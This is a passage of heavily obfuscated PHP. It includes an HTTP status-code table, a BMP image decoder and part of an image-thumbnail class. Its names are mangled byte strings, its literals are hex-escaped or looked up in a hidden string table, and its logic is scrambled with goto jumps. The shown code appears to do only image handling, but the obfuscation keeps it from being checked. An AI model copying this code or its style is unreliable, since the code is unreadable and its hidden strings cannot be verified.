$_SERVER[Å¸ş]; $EÕãÛ‘£²¼ = self::get($B„ÇíõÔÀÅ[198]); if (!$EÕãÛ‘£²¼) { return !1; } if (!preg_match($B„ÇíõÔÀÅ[1832], $EÕãÛ‘£²¼, $a•ñÄçÕ)) { return !1; } if ($a•ñÄçÕ[1] === $B„ÇíõÔÀÅ[33] && $a•ñÄçÕ[2] === $B„ÇíõÔÀÅ[33]) { return !1; } return array($a•ñÄçÕ[1] !== $B„ÇíõÔÀÅ[33] ? $a•ñÄçÕ[1] : null, $a•ñÄçÕ[2] !== $B„ÇíõÔÀÅ[33] ? $a•ñÄçÕ[2] : null); } public static $statusCode = array("\x31\x30\60" => "\x43\157\x6e\164\151\x6e\x75\x65", "\61\x30\x31" => "\123\167\151\x74\x63\x68\151\156\x67\x20\x50\x72\x6f\x74\x6f\143\157\154", "\x31\60\x32" => "\120\x72\157\x63\x65\163\163\x69\156\x67", "\x31\60\x33" => "\105\x61\162\154\171\x20\x48\x69\156\164\x73", "\62\60\60" => "\117\113", "\x32\x30\61" => "\x43\x72\145\141\x74\145\144", "\62\60\62" => "\101\x63\143\x65\x70\x74\x65\x64", "\62\x30\x33" => "\x4e\x6f\x6e\55\x41\x75\x74\150\x6f\162\151\164\x61\x74\151\166\145\x20\x49\156\146\x6f\162\155\141\x74\x69\x6f\x6e", "\x32\60\64" => "\x4e\157\40\x43\x6f\156\x74\x65\156\x74", "\x32\x30\65" => "\x52\x65\x73\145\x74\x20\103\157\156\x74\145\x6e\164", "\62\x30\x36" => "\x50\141\162\x74\151\x61\154\40\103\157\x6e\164\145\x6e\164", "\62\x30\67" => "\115\165\x6c\164\x69\55\123\x74\141\x74\x75\x73", "\63\x30\60" => "\115\165\x6c\x74\x69\160\154\x65\40\x43\150\x6f\151\143\x65\163", "\x33\x30\x31" => "\115\157\x76\145\x64\40\x50\145\x72\155\141\156\145\156\164\154\171", "\63\60\x32" => "\x46\157\165\x6e\x64", "\63\x30\63" => "\x53\x65\145\x20\x4f\x74\x68\145\x72", "\x33\60\x34" => "\x4e\x6f\164\x20\x4d\x6f\144\x69\x66\151\145\x64", "\63\x30\x35" => "\x55\x73\x65\x20\x50\162\157\170\x79", "\x33\60\x37" => "\124\145\155\160\157\162\141\162\x79\40\122\145\x64\x69\x72\x65\x63\x74", "\63\x30\x38" => "\x50\145\x72\x6d\141\156\x65\x6e\x74\x20\122\x65\x64\x69\162\x65\143\164", "\x34\60\x30" => "\102\141\144\40\122\145\x71\x75\145\x73\x74", "\x34\x30\x31" => "\125\x6e\x61\165\x74\150\157\x72\151\172\x65\144", "\64\x30\x32" => "\x50\141\171\x6d\145\x6e\x74\40\122\x65\x71\x75\x69\162\x65\144", "\x34\60\x33" => "\106\x6f\162\142\151\x64\x64\x65\x6e", "\x34\x30\64" => "\116\157\x74\40\x46\x6f\165\x6e\x64", "\64\60\65" => "\115\x65\164\x68\x6f\144\x20\x4e\157\x74\40\101\154\154\x6f\x77\145\144", "\64\60\66" => "\116\157\164\40\x41\x63\x63\145\160\164\x61\142\x6c\145", "\x34\60\67" => "\x50\162\x6f\x78\x79\x20\x41\165\x74\150\145\x6e\164\151\143\x61\164\x69\x6f\x6e\40\122\x65\161\x75\x69\x72\x65\144", "\x34\60\70" => "\x52\x65\x71\165\145\x73\164\x20\x54\151\x6d\145\157\165\164", "\x34\60\71" => "\x43\x6f\x6e\146\154\x69\143\164", "\64\x31\x30" => "\x47\x6f\156\145", "\x34\61\61" => "\114\x65\x6e\147\x74\x68\x20\122\145\x71\x75\x69\x72\145\144", "\x34\61\x32" => "\x50\162\x65\x63\157\x6e\144\151\x74\x69\157\156\40\x46\141\x69\154\145\144", "\64\x31\x33" => "\122\145\161\165\145\163\164\40\x45\x6e\164\151\164\171\40\x54\157\x6f\40\x4c\141\x72\147\145", "\64\61\64" => "\x52\x65\x71\165\145\163\164\40\x55\122\111\x20\124\157\157\x20\x4c\141\162\x67\145", "\64\x31\x35" => "\125\x6e\x73\x75\x70\x70\x6f\x72\x74\x65\144\40\x4d\x65\144\x69\x61\40\x54\x79\160\145", "\64\x31\x36" => "\122\x65\x71\165\145\x73\164\x65\144\40\x52\x61\156\147\x65\40\x4e\x6f\x74\x20\x53\141\164\151\163\x66\x69\x61\x62\154\145", "\64\61\67" => "\x45\170\160\145\143\x74\141\x74\x69\x6f\156\40\106\x61\x69\x6c\x65\144", "\x34\x32\62" => "\125\x6e\x70\x72\x6f\143\x65\x73\x73\x61\142\x6c\145\40\x45\156\x74\151\164\x79", "\64\62\63" => "\x4c\x6f\143\153\x65\144", "\x34\62\x34" => "\106\141\x69\x6c\145\x64\40\104\x65\x70\x65\x6e\144\x65\156\143\171", "\x34\62\65" => "\125\x6e\157\x72\x64\x65\x72\145\144\40\x43\157\x6c\154\x65\x63\164\x69\157\156", "\x34\62\x36" => "\x55\x70\x67\162\x61\144\145\x20\122\x65\161\x75\151\162\x65\x64", "\x34\x32\x38" => "\x50\162\145\143\x6f\156\144\x69\164\151\x6f\156\40\122\x65\x71\165\x69\162\145\x64", "\x34\62\71" => "\124\157\x6f\40\x4d\141\x6e\171\x20\x52\145\161\x75\145\x73\x74\163", "\x34\63\x31" => "\122\x65\x71\165\x65\163\164\x20\x48\x65\x61\144\x65\162\40\106\151\x65\x6c\144\x73\x20\124\157\x6f\40\x4c\141\x72\x67\145", "\x34\64\x34" => "\x4e\x6f\x20\x52\145\163\160\157\x6e\x73\145", "\x34\65\x30" => "\102\154\x6f\143\153\145\144\40\x62\171\40\127\151\x6e\144\157\167\163\40\120\x61\162\x65\x6e\x74\x61\x6c\40\103\x6f\x6e\x74\x72\157\x6c\x73", "\x34\65\x31" => "\x55\x6e\x61\166\x61\151\x6c\x61\142\x6c\145\x20\106\157\x72\x20\114\145\147\141\x6c\40\122\145\141\163\157\x6e\x73", "\64\71\64" => "\x52\x65\161\x75\x65\163\x74\x20\110\x65\141\144\x65\162\40\124\157\x6f\40\114\x61\x72\x67\145", "\65\x30\60" => "\x49\156\164\x65\162\x6e\141\154\40\123\x65\x72\166\145\162\40\105\162\162\x6f\x72", "\65\x30\61" => "\x4e\x6f\164\40\x49\155\160\154\145\x6d\145\x6e\x74\x65\x64", "\x35\x30\x32" => "\102\141\144\40\x47\141\x74\x65\167\x61\171", "\65\x30\63" => "\x53\x65\162\x76\x69\x63\145\40\x55\156\x61\x76\x61\x69\154\141\x62\x6c\x65", "\x35\x30\64" => "\x47\141\164\145\167\141\171\x20\x54\151\x6d\x65\157\x75\x74", "\x35\x30\x35" => "\x48\124\124\x50\40\126\145\162\163\151\x6f\x6e\x20\156\x6f\164\40\x73\x75\160\x70\x6f\x72\164\145\144", "\x35\x30\x37" => "\111\156\163\165\x66\146\151\143\x69\x65\x6e\164\x20\123\164\157\x72\x61\147\x65"); public static function code($e„İ¾†“Ğî) { $EÕ¾¢Û °Ú =& $_SERVER[Å¸ş]; $e„İ¾†“Ğî = $e„İ¾†“Ğî . $EÕ¾¢Û °Ú[33]; $e„ƒ´ÓÂâ¸ = self::$statusCode[$e„İ¾†“Ğî]; $e„ƒ´ÓÂâ¸ = $e„ƒ´ÓÂâ¸ ? "\x48\124\124\120\57\x31\56\x31\x20{$e„İ¾†“Ğî}\40" . $e„ƒ´ÓÂâ¸ : $EÕ¾¢Û °Ú[33]; return $e„ƒ´ÓÂâ¸; } } class ImageGdBMP { public static function load($EŸÓŒšˆİË) { $B»œÖ”ğÉ¢ = fopen($EŸÓŒšˆİË, $_SERVER[Å¸ş][1520]); if ($B»œÖ”ğÉ¢ === !1) { return !1; } $a×ù¥§ÉŠ = self::loadFromStream($B»œÖ”ğÉ¢); fclose($B»œÖ”ğÉ¢); return $a×ù¥§ÉŠ; } public static function loadFromStream($e‚´êèğ‡Ë) { $AÖ ™¶Ø†ò =& $_SERVER[Å¸ş]; $dê™–¥‡È› = fread($e‚´êèğ‡Ë, 14); if ($dê™–¥‡È› === !1) { return !1; } if ($dê™–¥‡È›[0] != $AÖ ™¶Ø†ò[1833] || $dê™–¥‡È›[1] != $AÖ ™¶Ø†ò[1834]) { return !1; } $aï‡ôƒ‚‹® = unpack($AÖ ™¶Ø†ò[1835] . $AÖ ™¶Ø†ò[1836] . $AÖ ™¶Ø†ò[1837] . $AÖ ™¶Ø†ò[1838] . $AÖ ™¶Ø†ò[1839], $dê™–¥‡È›); return self::loadFromStreamAndFileHeader($e‚´êèğ‡Ë, $aï‡ôƒ‚‹®); } public static function loadFromStreamAndFileHeader($DÏ‘·ÄÆ¡æ, array $EÙ™¦©ÖõÀ) { goto B¹ÛÂÔ·; a‚¯»£ªíò: if ($a‘©îèŠÓ¡ == 1 || $a‘©îèŠÓ¡ == 4 || $a‘©îèŠÓ¡ == 8) { goto eá–Øçñ×’; eÔªöß†°²: $E î¼œÍÆË = (1 << $a‘©îèŠÓ¡) - 1 << $Bë‹ì¼‘ÉÕ; if ($aÃ°‘ê©Ê¨ == 1 || $aÃ°‘ê©Ê¨ == 2) { $bÉéÃ §ÁŸ = 0; $a¦ì†ªƒŒë = $a‘©îèŠÓ¡ >> 2 & 1; for (;;) { if ($bÉéÃ §ÁŸ < -1 || $bÉéÃ §ÁŸ > $BëÉë˜¯Ô‚ || $EáİˆÊÉêá < -1 || $EáİˆÊÉêá > $E»ˆ½è®ÁÀ) { imagedestroy($eÍ‰Ëğ…²); return !1; } $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, 1); if ($Cæ™‰µÍ°ï === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } switch ($Cæ™‰µÍ°ï) { case $fÌ£‹ìÑÅ±[1858]: $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, 1); if ($Cæ™‰µÍ°ï === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } switch ($Cæ™‰µÍ°ï) { case $fÌ£‹ìÑÅ±[1858]: $EáİˆÊÉêá += $f¿†“ª“™®; $bÉéÃ §ÁŸ = 0; break; case $fÌ£‹ìÑÅ±[1860]: $EáİˆÊÉêá = 0; $bÉéÃ §ÁŸ = 0; break 3; case $fÌ£‹ìÑÅ±[1861]: $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, 2); if ($Cæ™‰µÍ°ï === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } list(, $F¾ì×ˆË˜Ğ, $Fó¨¸Ç—‡ä) = unpack($fÌ£‹ìÑÅ±[1862], $Cæ™‰µÍ°ï); $bÉéÃ §ÁŸ += $F¾ì×ˆË˜Ğ; $EáİˆÊÉêá += $Fó¨¸Ç—‡ä * $f¿†“ª“™®; break; default: list(, $eŒÄ÷«¬Â”) = unpack($fÌ£‹ìÑÅ±[1863], $Cæ™‰µÍ°ï); $bŒÔõ£ôÉ• = ($eŒÄ÷«¬Â” >> $a¦ì†ªƒŒë) + ($eŒÄ÷«¬Â” & $a¦ì†ªƒŒë); $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, $bŒÔõ£ôÉ• + 1 & ~1); if ($Cæ™‰µÍ°ï === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } for ($D¥‚´¢Äñ• = 0, $DğùÈˆ˜Ü† = 0; $D¥‚´¢Äñ• < $eŒÄ÷«¬Â”; ++$D¥‚´¢Äñ•, ++$bÉéÃ §ÁŸ, $DğùÈˆ˜Ü† += $a‘©îèŠÓ¡) { list(, $b¯‡íäÀ) = unpack($fÌ£‹ìÑÅ±[1863], $Cæ™‰µÍ°ï[$DğùÈˆ˜Ü† >> 3]); $DÊáŞÊˆ‡— = $DğùÈˆ˜Ü† & 7; imagesetpixel($eÍ‰Ëğ…², $bÉéÃ §ÁŸ, $EáİˆÊÉêá, $aŞéï´Ò¼°[($b¯‡íäÀ & $E î¼œÍÆË >> $DÊáŞÊˆ‡—) >> $Bë‹ì¼‘ÉÕ - $DÊáŞÊˆ‡—]); } break; } break; default: $Fæ¸ïÊÜä½ = fread($DÏ‘·ÄÆ¡æ, 1); if ($Fæ¸ïÊÜä½ === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } list(, $e»à—áÊÛ, $b¯‡íäÀ) = unpack($fÌ£‹ìÑÅ±[1862], $Cæ™‰µÍ°ï . $Fæ¸ïÊÜä½); for ($D¥‚´¢Äñ• = 0, $DğùÈˆ˜Ü† = 0; $D¥‚´¢Äñ• < $e»à—áÊÛ; ++$D¥‚´¢Äñ•, ++$bÉéÃ §ÁŸ, $DğùÈˆ˜Ü† += $a‘©îèŠÓ¡) { $DÊáŞÊˆ‡— = $DğùÈˆ˜Ü† & 7; imagesetpixel($eÍ‰Ëğ…², $bÉéÃ §ÁŸ, $EáİˆÊÉêá, $aŞéï´Ò¼°[($b¯‡íäÀ & $E î¼œÍÆË >> $DÊáŞÊˆ‡—) >> $Bë‹ì¼‘ÉÕ - $DÊáŞÊˆ‡—]); } break; } } } else { for ($D´©•¡è¦İ = 0; $D´©•¡è¦İ < $a³¾§ã­Î; ++$D´©•¡è¦İ, $EáİˆÊÉêá += $f¿†“ª“™®) { $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, $D‰Œ±Çƒİ); if ($Cæ™‰µÍ°ï === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } $DğùÈˆ˜Ü† = 0; for ($bÉéÃ §ÁŸ = 0; $bÉéÃ §ÁŸ < $BëÉë˜¯Ô‚; ++$bÉéÃ §ÁŸ, $DğùÈˆ˜Ü† += $a‘©îèŠÓ¡) { list(, $b¯‡íäÀ) = unpack($fÌ£‹ìÑÅ±[1863], $Cæ™‰µÍ°ï[$DğùÈˆ˜Ü† >> 3]); $DÊáŞÊˆ‡— = $DğùÈˆ˜Ü† & 7; imagesetpixel($eÍ‰Ëğ…², $bÉéÃ §ÁŸ, $EáİˆÊÉêá, $aŞéï´Ò¼°[($b¯‡íäÀ & $E î¼œÍÆË >> $DÊáŞÊˆ‡—) >> $Bë‹ì¼‘ÉÕ - $DÊáŞÊˆ‡—]); } } } goto BæùÀ¨²ôË; f„Õ·¬–¢: $aŞéï´Ò¼° = array(); for ($D¥‚´¢Äñ• = 0; $D¥‚´¢Äñ• < $aâÂ½µ‘¶; ++$D¥‚´¢Äñ•) { $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, $b™·¬º—¹ß); if ($Cæ™‰µÍ°ï === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } extract(unpack($fÌ£‹ìÑÅ±[1859], $Cæ™‰µÍ°ï . $fÌ£‹ìÑÅ±[1858])); $aŞéï´Ò¼°[] = imagecolorallocate($eÍ‰Ëğ…², $dà­ã°‹è‡, $eá µŸ¿¯‡, $DÊáŞÊˆ‡—); } $Bë‹ì¼‘ÉÕ = 8 - $a‘©îèŠÓ¡; goto eÔªöß†°²; eá–Øçñ×’: $eÍ‰Ëğ…² = imagecreate($BëÉë˜¯Ô‚, $a³¾§ã­Î); $b™·¬º—¹ß = $eØÖ¨îŸğ == 12 ? 3 : 4; $aâÂ½µ‘¶ = $b‡‰Ô¾šÎ× ? $b‡‰Ô¾šÎ× : pow(2, $a‘©îèŠÓ¡); goto f„Õ·¬–¢; BæùÀ¨²ôË: } else { goto A®ŞÅ›­Â; bÉ®µÅ©©: $fïĞ²‰ÆÄ = $aÙêŠµÒ»ñ ? 1 / $aÙêŠµÒ»ñ : 1; $eœÕ ×ì = $e¾Æ¶À‚“ ? 1 / $e¾Æ¶À‚“ : 1; $E³Û¡âí¡á = $B”’§äñ¼è ? 1 / $B”’§äñ¼è : 1; goto aÔÀ†ìï; aÈœÚé‘ğŠ: $D×°©¯ÑÜØ = $a‘©îèŠÓ¡ >> 3; $DÊšÀ›“Æ¶ = $dÊÏ–Ÿë‡µ ? 127 : 0; $BºÆÄ‘è–ã = $dÊÏ–Ÿë‡µ ? 1 / $dÊÏ–Ÿë‡µ : 1; goto bÉ®µÅ©©; A®ŞÅ›­Â: $eÍ‰Ëğ…² = imagecreatetruecolor($BëÉë˜¯Ô‚, $a³¾§ã­Î); imagealphablending($eÍ‰Ëğ…², !1); if ($dÊÏ–Ÿë‡µ) { imagesavealpha($eÍ‰Ëğ…², !0); } goto aÈœÚé‘ğŠ; aÔÀ†ìï: for ($D´©•¡è¦İ = 0; $D´©•¡è¦İ < $a³¾§ã­Î; ++$D´©•¡è¦İ, $EáİˆÊÉêá += $f¿†“ª“™®) { $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, $D‰Œ±Çƒİ); if ($Cæ™‰µÍ°ï === !1) { imagedestroy($eÍ‰Ëğ…²); return !1; } $DğùÈˆ˜Ü† = 0; for ($bÉéÃ §ÁŸ = 0; $bÉéÃ §ÁŸ < $BëÉë˜¯Ô‚; ++$bÉéÃ §ÁŸ, $DğùÈˆ˜Ü† += $D×°©¯ÑÜØ) { list(, $b¯‡íäÀ) = unpack($fÌ£‹ìÑÅ±[1840], substr($Cæ™‰µÍ°ï, $DğùÈˆ˜Ü†, $D×°©¯ÑÜØ) . $fÌ£‹ìÑÅ±[1864]); $F£ªø „óÇ = $b¯‡íäÀ & $dÊÏ–Ÿë‡µ; $dŠÍŸ‹¡àø = $b¯‡íäÀ & $aÙêŠµÒ»ñ; $eŒ…Ò®ñ‚ = $b¯‡íäÀ & $e¾Æ¶À‚“; $FÃ¤¥‘óÑ = $b¯‡íäÀ & $B”’§äñ¼è; $AçÀù¯Íöó = $DÊšÀ›“Æ¶ - (($F£ªø „óÇ << 7) - $F£ªø „óÇ) * $BºÆÄ‘è–ã; $dà­ã°‹è‡ = (($dŠÍŸ‹¡àø << 8) - $dŠÍŸ‹¡àø) * $fïĞ²‰ÆÄ; $eá µŸ¿¯‡ = (($eŒ…Ò®ñ‚ << 8) - $eŒ…Ò®ñ‚) * $eœÕ ×ì; $DÊáŞÊˆ‡— = (($FÃ¤¥‘óÑ << 8) - $FÃ¤¥‘óÑ) * $E³Û¡âí¡á; imagesetpixel($eÍ‰Ëğ…², $bÉéÃ §ÁŸ, $EáİˆÊÉêá, $AçÀù¯Íöó << 24 | $dà­ã°‹è‡ << 16 | $eá µŸ¿¯‡ << 8 | $DÊáŞÊˆ‡—); } } imagealphablending($eÍ‰Ëğ…², !0); goto Aé˜©˜Ú“Ò; Aé˜©˜Ú“Ò: } return $eÍ‰Ëğ…²; goto A—ÖŒ˜œïÕ; CÜ’ÑÜëÔˆ: if ($BëÉë˜¯Ô‚ == 0 || $E»ˆ½è®ÁÀ == 0 || $CàùŠ¥Ù® != 1 || ($dÊÏ–Ÿë‡µ & $aÙêŠµÒ»ñ) != 0 || ($dÊÏ–Ÿë‡µ & $e¾Æ¶À‚“) != 0 || ($dÊÏ–Ÿë‡µ & $B”’§äñ¼è) != 0 || ($aÙêŠµÒ»ñ & $e¾Æ¶À‚“) != 0 || ($aÙêŠµÒ»ñ & $B”’§äñ¼è) != 0 || ($e¾Æ¶À‚“ & $B”’§äñ¼è) != 0) { return !1; } if ($aÃ°‘ê©Ê¨ == 4 || $aÃ°‘ê©Ê¨ == 5) { $Cæ™‰µÍ°ï = stream_get_contents($DÏ‘·ÄÆ¡æ, $Ašº£İ©Ş); if ($Cæ™‰µÍ°ï === !1) { return !1; } return imagecreatefromstring($Cæ™‰µÍ°ï); } $D‰Œ±Çƒİ = $BëÉë˜¯Ô‚ * $a‘©îèŠÓ¡ + 31 >> 3 & ~3; goto föÏ¸¥ºÆ»; B¹ÛÂÔ·: $fÌ£‹ìÑÅ± =& $_SERVER[Å¸ş]; if ($EÙ™¦©ÖõÀ[$fÌ£‹ìÑÅ±[388]] != 19778) { return !1; } $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, 4); goto Bè›—‡ù»æ; Bè›—‡ù»æ: if ($Cæ™‰µÍ°ï === !1) { return !1; } list(, $eØÖ¨îŸğ) = unpack($fÌ£‹ìÑÅ±[1840], $Cæ™‰µÍ°ï); if ($eØÖ¨îŸğ == 12) { goto aöØÕŸŒò; FÏ÷µƒÉ¦Â: $B”’§äñ¼è = 255; goto D‹Ÿ…Ñ›ÌŠ; Cœ«æ÷é: $b‡‰Ô¾šÎ× = $Aè§´ñ¼Å— = $dÊÏ–Ÿë‡µ = $aÃ°‘ê©Ê¨ = 0; $aÙêŠµÒ»ñ = 16711680; $e¾Æ¶À‚“ = 65280; goto FÏ÷µƒÉ¦Â; aöØÕŸŒò: $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, $eØÖ¨îŸğ - 4); if ($Cæ™‰µÍ°ï === !1) { return !1; } extract(unpack($fÌ£‹ìÑÅ±[1841] . $fÌ£‹ìÑÅ±[1842] . $fÌ£‹ìÑÅ±[1843] . $fÌ£‹ìÑÅ±[1844], $Cæ™‰µÍ°ï)); goto Cœ«æ÷é; D‹Ÿ…Ñ›ÌŠ: } else { if (124 < $eØÖ¨îŸğ || $eØÖ¨îŸğ < 40) { return !1; } else { goto Fªßº¹¯Œ“; FË¸Ò¿ã‰: if ($BëÉë˜¯Ô‚ & 2147483648) { $BëÉë˜¯Ô‚ = -(~$BëÉë˜¯Ô‚ & 4294967295) - 1; } if ($E»ˆ½è®ÁÀ & 2147483648) { $E»ˆ½è®ÁÀ = -(~$E»ˆ½è®ÁÀ & 4294967295) - 1; } if ($bê¯œÖ²æØ & 2147483648) { $bê¯œÖ²æØ = -(~$bê¯œÖ²æØ & 4294967295) - 1; } goto BÊµïº¢²; Fªßº¹¯Œ“: $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, 36); if ($Cæ™‰µÍ°ï === !1) { return !1; } extract(unpack($fÌ£‹ìÑÅ±[1845] . $fÌ£‹ìÑÅ±[1846] . $fÌ£‹ìÑÅ±[1843] . $fÌ£‹ìÑÅ±[1847] . $fÌ£‹ìÑÅ±[1848] . $fÌ£‹ìÑÅ±[1849] . $fÌ£‹ìÑÅ±[1850] . $fÌ£‹ìÑÅ±[1851] . $fÌ£‹ìÑÅ±[1852] . $fÌ£‹ìÑÅ±[1853], $Cæ™‰µÍ°ï)); goto FË¸Ò¿ã‰; BÊµïº¢²: if ($bØÇ¶º–©Ä & 2147483648) { $bØÇ¶º–©Ä = -(~$bØÇ¶º–©Ä & 4294967295) - 1; } if ($EÙ™¦©ÖõÀ[$fÌ£‹ìÑÅ±[522]] != 0) { $bõƒ¨›á = $a‘©îèŠÓ¡ == 1 || $a‘©îèŠÓ¡ == 4 || $a‘©îèŠÓ¡ == 8 ? ($b‡‰Ô¾šÎ× ? $b‡‰Ô¾šÎ× : pow(2, $a‘©îèŠÓ¡)) << 2 : 0; $d¶êîàì÷À = $Ašº£İ©Ş ? $Ašº£İ©Ş : ($BëÉë˜¯Ô‚ * $a‘©îèŠÓ¡ + 31 >> 3 & ~3) * abs($E»ˆ½è®ÁÀ); $bÃìî„ÈƒÓ = $EÙ™¦©ÖõÀ[$fÌ£‹ìÑÅ±[522]] - $d¶êîàì÷À - $bõƒ¨›á - 14; if ($eØÖ¨îŸğ < $bÃìî„ÈƒÓ && 40 <= $eØÖ¨îŸğ && $eØÖ¨îŸğ <= 124) { $eØÖ¨îŸğ = $bÃìî„ÈƒÓ; } } if ($eØÖ¨îŸğ - 40 > 0) { $Cæ™‰µÍ°ï = fread($DÏ‘·ÄÆ¡æ, $eØÖ¨îŸğ - 40); if ($Cæ™‰µÍ°ï === !1) { return !1; } extract(unpack($fÌ£‹ìÑÅ±[1854] . $fÌ£‹ìÑÅ±[1855] . $fÌ£‹ìÑÅ±[1856] . $fÌ£‹ìÑÅ±[1857], $Cæ™‰µÍ°ï . str_repeat($fÌ£‹ìÑÅ±[1858], 120))); } else { $dÊÏ–Ÿë‡µ = $aÙêŠµÒ»ñ = $e¾Æ¶À‚“ = $B”’§äñ¼è = 0; } goto cŒ¤×›–ÁŠ; cŒ¤×›–ÁŠ: if (($a‘©îèŠÓ¡ == 16 || $a‘©îèŠÓ¡ == 24 || $a‘©îèŠÓ¡ == 32) && $aÃ°‘ê©Ê¨ == 0 && $aÙêŠµÒ»ñ == 0 && $e¾Æ¶À‚“ == 0 && $B”’§äñ¼è == 0) { switch ($a‘©îèŠÓ¡) { case 16: $aÙêŠµÒ»ñ = 31744; $e¾Æ¶À‚“ = 992; $B”’§äñ¼è = 31; break; case 24: case 32: $aÙêŠµÒ»ñ = 16711680; $e¾Æ¶À‚“ = 65280; $B”’§äñ¼è = 255; break; } } goto F»‰Ï„¢À; F»‰Ï„¢À: } } goto CÜ’ÑÜëÔˆ; föÏ¸¥ºÆ»: $a³¾§ã­Î = abs($E»ˆ½è®ÁÀ); $EáİˆÊÉêá = $E»ˆ½è®ÁÀ > 0 ? $a³¾§ã­Î - 1 : 0; $f¿†“ª“™® = $E»ˆ½è®ÁÀ > 0 ? -1 : 1; goto a‚¯»£ªíò; A—ÖŒ˜œïÕ: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($e³³Ú’¹œ“, $F’í‰õÅö‘) { goto D££éöŒ¢; D££éöŒ¢: $this->srcFile = $e³³Ú’¹œ“; $this->echoType = $F’í‰õÅö‘; $this->im = self::image($e³³Ú’¹œ“); goto CÏÚĞ¢È‡«; C°ì‚Éô¢«: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto e¯¯¸¡; CÏÚĞ¢È‡«: if (!$this->im) { return !1; } $a–Ö…ŠøÔš = $_SERVER[Å¸ş][33]; $this->imgData = GetImageSize($e³³Ú’¹œ“, $a–Ö…ŠøÔš); goto C°ì‚Éô¢«; e¯¯¸¡: } public static function image($eÎ¦»Ö¥‚¨) { $C½åƒğ›ìß =& $_SERVER[Å¸ş]; $Bá÷˜’¼µ¡ = $C½åƒğ›ìß[33]; $BŞõìÕù‚ = GetImageSize($eÎ¦»Ö¥‚¨, $Bá÷˜’¼µ¡); $fàÉ”¿ˆáÏ = !1; switch ($BŞõìÕù‚[2]) { case IMAGETYPE_GIF: if (!function_exists($C½åƒğ›ìß[1865])) { break; } $fàÉ”¿ˆáÏ = imagecreatefromgif($eÎ¦»Ö¥‚¨); break; case IMAGETYPE_JPEG: if (!function_exists($C½åƒğ›ìß[1866])) { break; } $fàÉ”¿ˆáÏ = imagecreatefromjpeg($eÎ¦»Ö¥‚¨); break; case IMAGETYPE_PNG: if (!function_exists($C½åƒğ›ìß[1867])) { break; } $fàÉ”¿ˆáÏ = @imagecreatefrompng($eÎ¦»Ö¥‚¨); imagesavealpha($fàÉ”¿ˆáÏ, !0); break; case IMAGETYPE_XBM: $fàÉ”¿ˆáÏ = imagecreatefromxbm($eÎ¦»Ö¥‚¨); break; case IMAGETYPE_WBMP: $fàÉ”¿ˆáÏ = imagecreatefromwbmp($eÎ¦»Ö¥‚¨); break; case IMAGETYPE_BMP: $fàÉ”¿ˆáÏ = imagecreatefrombmp($eÎ¦»Ö¥‚¨); break; default: break; } return $fàÉ”¿ˆáÏ; } public static function imageSize($F§Á‘Â½˜Œ) { $AÓŒ”·—¶— =& $_SERVER[Å¸ş]; $CôåÚõ = GetImageSize($F§Á‘Â½˜Œ); if (!$CôåÚõ) { return !1; } return array($AÓŒ”·—¶—[1868] => $CôåÚõ[0], $AÓŒ”·—¶—[1869] => $CôåÚõ[1]); } function distortion($aâ¹øàî¤, $aáàö„ó¿, $d‰ö‹ä®«) { $D¬öê½¬‘¼ = $this->creatImage($this->im, $aáàö„ó¿, $d‰ö‹ä®«, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D¬öê½¬‘¼, $aâ¹øàî¤); } function prorate($Eç¦¬Ú£, $c±‚õÌ¾æ, $CÌ®â¬Áõ) { $bóŠÒ·ï = $c±‚õÌ¾æ / $CÌ®â¬Áõ; $dğ—£±ˆˆÔ = $this->srcW / $this->srcH; if ($bóŠÒ·ï <= $dğ—£±ˆˆÔ) { $B£éç‘Ìõ½ = $c±‚õÌ¾æ; $C×‹˜Ôä‘ = $B£éç‘Ìõ½ * ($this->srcH / $this->srcW); } else { $C×‹˜Ôä‘ = $CÌ®â¬Áõ; $B£éç‘Ìõ½ = $C×‹˜Ôä‘ * ($this->srcW / $this->srcH); } if ($this->srcW > $c±‚õÌ¾æ || $this->srcH > $CÌ®â¬Áõ) { $D§‘‰’èÌ = $this->creatImage($this->im, $B£éç‘Ìõ½, $C×‹˜Ôä‘, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $D§‘‰’èÌ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $D§‘‰’èÌ = $this->autoRotate($D§‘‰’èÌ); return $this->echoImage($D§‘‰’èÌ, $Eç¦¬Ú£); } private function autoRotate($B¤»ĞÎ…Õ÷) { goto A„óÚÏÅø; FïÀğì¾¦: if ($aáñåÉ¦é[$d”Şõé…[1871]] == 8) { $B‚áë­‘ª† = 270; } if ($aáñåÉ¦é[$d”Şõé…[1871]] == 3) { $B‚áë­‘ª† = 180; } return $this->rotateDegree($B¤»ĞÎ…Õ÷, $B‚áë­‘ª†); goto EË‘ºª¶×Ô; b â¥œÂÛñ: if (!$aáñåÉ¦é || !isset($aáñåÉ¦é[$d”Şõé…[1871]]) || $aáñåÉ¦é[$d”Şõé…[1871]] == 1) { return $B¤»ĞÎ…Õ÷; } $B‚áë­‘ª† = 0; if ($aáñåÉ¦é[$d”Şõé…[1871]] == 6) { $B‚áë­‘ª† = 90; } goto FïÀğì¾¦; A„óÚÏÅø: $d”Şõé… =& $_SERVER[Å¸ş]; if (!$B¤»ĞÎ…Õ÷ || !function_exists($d”Şõé…[1870])) { return $B¤»ĞÎ…Õ÷; } $aáñåÉ¦é = exif_read_data($this->srcFile); goto b 